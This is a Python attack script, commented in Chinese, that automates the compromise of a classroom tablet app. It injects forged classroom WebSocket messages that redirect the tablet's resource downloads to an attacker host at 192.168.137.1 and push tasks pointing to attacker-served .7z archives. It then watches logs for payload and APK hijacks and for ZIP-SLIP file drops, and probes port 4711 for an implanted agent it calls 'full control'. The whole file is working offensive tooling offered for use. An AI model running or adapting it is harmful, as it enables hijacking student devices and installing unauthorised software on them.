# -*- coding: utf-8 -*-
"""plan_c_autochain.py - 无人值守自动链(方案C)。

策略(不依赖猜 resourceId):
  1) 常驻监视教室 WS(ws8889.log) -> 一旦 ws_open>0(平板进课堂) 立刻开工
  2) 立刻注入 50001(default_tag): hostName=192.168.137.1 port=80 rootPath=/xh
     => 端侧后续所有 StuFtpManager.downloadFromTeacher 的**字节源**归我们
        (RequestBuilder 对无 scheme 的 URL 自动补 http://)
  3) 周期性注入 canvas_tag type=0(任务下发) + type=3(短语) 等多种形态, 促使端侧发起资源下载
     - type=0 用多种 id/desktopId/content 组合(端侧可能用本地 DB 或 API 解析)
     - type=3 用我们自己的 URL(已实测 100% 触发下载, 作为通道保活/金丝雀)
  4) 全程监视三个决定性指标:
     A. npcap_http80.log: [PAYLOAD-SERVE2]/[HIGH-VALUE-RESOURCE]/[APK-HIJACK]  <- 端侧取我们的文件
     B. proxy8888.log:    'conn'/'req'/'apk' > 0                              <- ZIP-SLIP 落盘+代理切换
     C. 4711 端口出现连接                                                      <- agent 上线
  5) 命中即锁存到 plan_c_hits.log 并继续(不退出)

日志: plan_c.log / plan_c_hits.log
"""
import io
import json
import os
import re
import socket
import time

BASE = os.path.dirname(os.path.abspath(__file__))
WS = os.path.join(BASE, "ws8889.log")
NHTTP = os.path.join(BASE, "npcap_http80.log")
PROXY = os.path.join(BASE, "proxy8888.log")
INJECT = os.path.join(BASE, "ws_inject.txt")
LOG = os.path.join(BASE, "plan_c.log")
HITS = os.path.join(BASE, "plan_c_hits.log")
OUR = "192.168.137.1"
PAD = "192.168.137.77"
ROOM = "UXHOVJJF"
UID = "2112229"

_st = {"ws_seen": 0, "inject": 0, "srv2": 0, "apkhijack": 0, "proxy_hit": 0, "agent4711": 0}


def w(m, hit=False):
    line = "%s %s" % (time.strftime("%H:%M:%S"), m)
    try:
        with io.open(LOG, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass
    if hit:
        try:
            with io.open(HITS, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except Exception:
            pass
    print(line)


def tail(p, n=400):
    try:
        with io.open(p, encoding="utf-8", errors="replace") as f:
            return f.readlines()[-n:]
    except Exception:
        return []


def ws_open():
    for ln in reversed(tail(WS, 80)):
        m = re.search(r'"ws_open":\s*(\d+)', ln)
        if m:
            return int(m.group(1))
    return 0


def frame(mtype, data, cid, tag="canvas_tag"):
    return json.dumps({
        "cId": cid, "cmd": 2, "from": "10001", "gt": 0, "id": "1349658", "rt": 1,
        "smsg": {"classRoomId": ROOM, "createTag": tag, "data": data,
                 "forward": 0, "senderId": 0, "type": mtype, "userIds": UID},
        "tags": ["RWYZKUIF"]}, ensure_ascii=False)


def inj(mtype, data, cid, tag="canvas_tag"):
    try:
        with io.open(INJECT, "w", encoding="utf-8") as f:
            f.write(frame(mtype, data, cid, tag))
        _st["inject"] += 1
        return True
    except Exception as e:
        w("  inject err %r" % (e,))
        return False


def esc(o):
    return json.dumps(o, ensure_ascii=False).replace("\\", "\\\\").replace('"', '\\"')


def port_open(ip, port, t=0.35):
    s = socket.socket()
    s.settimeout(t)
    try:
        s.connect((ip, port))
        return True
    except Exception:
        return False
    finally:
        try:
            s.close()
        except Exception:
            pass


def scan_new():
    """返回 (srv2, apkhijack, proxy_hit, agent)"""
    nh = tail(NHTTP, 600)
    s2 = sum(1 for l in nh if "PAYLOAD-SERVE2" in l)
    ak = sum(1 for l in nh if "APK-HIJACK" in l)
    ph = 0
    for l in tail(PROXY, 120):
        m = re.search(r"'conn': (\d+)", l)
        if m and int(m.group(1)) > 0:
            ph = 1
        m2 = re.search(r"'apk': (\d+)", l)
        if m2 and int(m2.group(1)) > 0:
            ph = 1
    ag = 1 if port_open(PAD, 4711) else 0
    return s2, ak, ph, ag


if __name__ == "__main__":
    w("===== plan_c_autochain start =====")
    armed = False
    tick = 0
    while True:
        try:
            op = ws_open()
            if op <= 0:
                if tick % 20 == 0:
                    w("等待平板进课堂(ws_open=0)...")
                time.sleep(6)
                tick += 1
                continue
            # 课堂已连上 => 开工
            if not armed:
                armed = True
                w("★★★ 检测到 ws_open=%d ⇒ 开始方案C" % op, hit=True)
            # 持续维持 50001(每 3 轮刷一次)
            if tick % 3 == 0:
                inj(50001, esc({"port": 80, "hostName": OUR, "rootPath": "/xh",
                                "downloadWaitTime": 0, "startLimitRate": 1.0}), "1794%06d" % (tick % 1000000),
                    "default_tag")
            # 交替注入: type=3(金丝雀/保活) 与 type=0(任务, 多变体)
            if tick % 2 == 0:
                fn = "pc%d.7z" % (tick % 50)
                inj(3, esc({"voiceId": "pc%d" % (tick % 50),
                            "voiceUrl": "http://%s:80/%s" % (OUR, fn)}),
                    "1795%06d" % (tick % 1000000))
            else:
                # 任务变体: 覆盖常见字段与 id 组合
                for rid in ("1349658", "1594128", "1", "0"):
                    tsk = {"taskId": rid, "resourceId": rid, "sourceId": rid,
                           "desktopId": int(rid) if rid.isdigit() else 0,
                           "classroomId": ROOM, "classId": 0, "schoolId": 0,
                           "content": "http://%s:80/xh/ztktv4_resource/pc.7z" % OUR,
                           "zipUrl": "http://%s:80/xh/ztktv4_resource/pc.7z" % OUR,
                           "name": "pc.7z", "itemType": 31, "type": 1, "status": 1,
                           "isNeedDownLoad": True, "needDecode": True,
                           "memo": "pc", "createTime": 0, "updateTime": 0}
                    inj(0, esc(tsk), "1796%06d" % (tick % 1000000))
                    time.sleep(2)
            time.sleep(5)
            tick += 1
            s2, ak, ph, ag = scan_new()
            if s2 != _st["srv2"]:
                w("!! [PAYLOAD-SERVE2] 计=%d (端侧取我们的载荷)" % s2, hit=True)
                _st["srv2"] = s2
            if ak != _st["apkhijack"]:
                w("!! [APK-HIJACK] 计=%d (端侧取我们的APK)" % ak, hit=True)
                _st["apkhijack"] = ak
            if ph and not _st["proxy_hit"]:
                w("!!! [18080 命中] 平板请求打到我们代理 ⇒ ZIP-SLIP 落盘成功/代理已切换", hit=True)
                _st["proxy_hit"] = 1
            if ag and not _st["agent4711"]:
                w("!!!!!! [4711 上线] agent 已安装并运行 ⇒ 完全控制!", hit=True)
                _st["agent4711"] = 1
            if tick % 30 == 0:
                w("[stat] %s ws_open=%d" % (json.dumps(_st), op))
        except Exception as e:
            w("loop err %r" % (e,))
            time.sleep(5)
